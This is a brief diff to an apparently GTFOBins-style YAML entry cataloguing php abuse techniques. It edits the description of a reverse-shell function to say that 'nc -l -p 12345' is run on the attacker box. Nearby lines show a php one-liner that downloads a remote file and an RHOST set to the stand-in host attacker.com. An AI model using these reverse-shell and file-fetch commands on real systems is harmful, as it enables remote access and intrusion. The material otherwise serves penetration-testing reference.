@@ -32,7 +32,7 @@ functions:
         export LFILE=where_to_save
         php -r '$c=file_get_contents($_ENV["URL"]);file_put_contents($_ENV["LFILE"], $c);'
   reverse-shell:
-    - description: Run `nc -l -p 12345` to receive the shell on the other end.
+    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
       code: |
         export RHOST=attacker.com
         export RPORT=12345 
